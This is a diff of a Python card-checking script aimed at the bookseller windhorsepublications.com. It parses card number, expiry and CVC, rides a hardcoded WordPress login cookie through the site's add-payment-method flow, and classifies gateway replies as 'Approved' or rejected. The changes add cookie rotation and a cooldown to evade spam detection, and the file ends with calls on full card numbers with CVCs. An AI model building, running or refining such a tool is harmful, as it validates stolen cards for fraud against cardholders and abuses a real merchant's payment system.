@@ -1,26 +1,43 @@
-import time
-import requests,re
-from bs4 import BeautifulSoup
 import requests
-import base64
 import re
 import random
-
-
-
-
-def Gele(ccx):
-    ccx = ccx.strip()
+import time
+import string
+import base64
+from user_agent import generate_user_agent
+from bs4 import BeautifulSoup
+def Fele(ccx):
+  import requests
+  ccx = ccx.strip()
+  n = ccx.split("|")[0]
+  mm = ccx.split("|")[1]
+  yy = ccx.split("|")[2]
+  cvc = ccx.split("|")[3]
+  if "20" in yy:  # Mo3gza
+    yy = yy.split("20")[1]
+  with open('fileb1.txt', 'r') as file:
+    first_line = file.readline()
+    print(n,mm,yy,cvc)
     
-    # Step 1: Parse CC Details
-    try:
-        n, mm, yy, cvc = ccx.split("|")
-    except ValueError:
-        print("Invalid card format. Use: '1234567890123456|MM|YY|CVC'")
-        return None
+    last_used_times = {}
+    
+  while True:
+    lines = '''remeki5997%7C1757414483%7CoBi90QfnxRXkJ7z2sYoZ0zNXvlNdXBmLLP4XDNxqwYg%7C8ab881e3e8012e4acc920fe6be474f1988cd05ff255511d077d7b63d2da9f544'''
 
-
-    koi = 'remeki5997%7C1757414483%7CoBi90QfnxRXkJ7z2sYoZ0zNXvlNdXBmLLP4XDNxqwYg%7C8ab881e3e8012e4acc920fe6be474f1988cd05ff255511d077d7b63d2da9f544'
+    lines = lines.strip().split('\n')
+    random_line_number = random.randint(0, len(lines) - 1)
+    big = lines[random_line_number]
+    current_time = time.time()
+    if big in last_used_times:
+	        time_since_last_use = current_time - last_used_times[big]
+	        if time_since_last_use < 20:
+	            continue
+    if big == first_line:
+      pass
+    else:
+      break
+  with open('fileb3.txt', 'w') as file:
+    file.write(big)
 
     cookies = {
     '_ga': 'GA1.1.1552341977.1748783838',
@@ -31,18 +48,16 @@ def Gele(ccx):
     'cookie_notice_accepted': 'false',
     'etBloomCookie_optin_1': 'true',
     '_gcl_au': '1.1.1073672641.1748783837.2041287102.1756204873.1756204882',
-    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': 'remeki5997%7C1757414483%7CoBi90QfnxRXkJ7z2sYoZ0zNXvlNdXBmLLP4XDNxqwYg%7C8ab881e3e8012e4acc920fe6be474f1988cd05ff255511d077d7b63d2da9f544',
-    'wp_woocommerce_session_e51f0ec750d984778eada43421443aa3': '26199%7C1756377683%7C1756291283%7C%24generic%24rzTUQ2rRZBBeB8aWSc4JLRJZP3aUyySrdn0o9aSZ',
+    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': big,
     '_ga_7FLK339XP5': 'GS2.1.s1756204854$o12$g1$t1756204886$j28$l0$h0',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-08-27%2013%3A26%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
-    'sbjs_first_add': 'fd%3D2025-08-27%2013%3A26%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current_add': 'fd%3D2025-08-30%2006%3A34%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_first_add': 'fd%3D2025-08-30%2006%3A34%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
 }
-
     headers = {
     'authority': 'www.windhorsepublications.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -105,16 +120,15 @@ def Gele(ccx):
     'cookie_notice_accepted': 'false',
     'etBloomCookie_optin_1': 'true',
     '_gcl_au': '1.1.1073672641.1748783837.2041287102.1756204873.1756204882',
-    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': 'remeki5997%7C1757414483%7CoBi90QfnxRXkJ7z2sYoZ0zNXvlNdXBmLLP4XDNxqwYg%7C8ab881e3e8012e4acc920fe6be474f1988cd05ff255511d077d7b63d2da9f544',
-    'wp_woocommerce_session_e51f0ec750d984778eada43421443aa3': '26199%7C1756377683%7C1756291283%7C%24generic%24rzTUQ2rRZBBeB8aWSc4JLRJZP3aUyySrdn0o9aSZ',
+    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': big,
     '_ga_7FLK339XP5': 'GS2.1.s1756204854$o12$g1$t1756204886$j28$l0$h0',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-08-27%2013%3A26%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
-    'sbjs_first_add': 'fd%3D2025-08-27%2013%3A26%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current_add': 'fd%3D2025-08-30%2006%3A34%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_first_add': 'fd%3D2025-08-30%2006%3A34%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
 }
 
     headers = {
@@ -235,17 +249,17 @@ def Gele(ccx):
     'cookie_notice_accepted': 'false',
     'etBloomCookie_optin_1': 'true',
     '_gcl_au': '1.1.1073672641.1748783837.2041287102.1756204873.1756204882',
-    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': 'remeki5997%7C1757414483%7CoBi90QfnxRXkJ7z2sYoZ0zNXvlNdXBmLLP4XDNxqwYg%7C8ab881e3e8012e4acc920fe6be474f1988cd05ff255511d077d7b63d2da9f544',
-    'wp_woocommerce_session_e51f0ec750d984778eada43421443aa3': '26199%7C1756377683%7C1756291283%7C%24generic%24rzTUQ2rRZBBeB8aWSc4JLRJZP3aUyySrdn0o9aSZ',
+    'wordpress_logged_in_e51f0ec750d984778eada43421443aa3': big,
     '_ga_7FLK339XP5': 'GS2.1.s1756204854$o12$g1$t1756204886$j28$l0$h0',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-08-27%2013%3A15%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-08-27%2013%3A15%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2025-08-30%2006%3A34%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_first_add': 'fd%3D2025-08-30%2006%3A34%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fpayment-methods%2F',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2Fadd-payment-method%2F',
 }
+
 
     headers = {
     'authority': 'www.windhorsepublications.com',
@@ -301,15 +315,18 @@ def Gele(ccx):
     re.DOTALL
 )
 
-# Result print karna
     if match:
-        print(match.group(1).strip())
-        print(" part 2")
         return match.group(1).strip()
+    elif 'risk_threshold' in response.text:
+        result = "Gateway Rejected: Risk Threshold"
+        return result
+    elif 'Please wait for 20 seconds.' in response.text:
+        result = "Sᴘᴀᴍ Dᴇᴛᴇᴄᴛᴇᴅ"
+        return result
+    elif 'Duplicate' in response.text:
+        return "1000:Approved"
     else:
-        print(response.text)
-        return "1000:Approved"                            
-
-print(Gele("4258810718226890|02|2027|653"))                                                            
-                                                                                                        
-                                                                                                                                                                
+        return "1000:Approved"                                  
+        
+print(Fele("4021676185536012|06|2026|5146"))        
+                                                                                                                                                                                                                                                                                                               
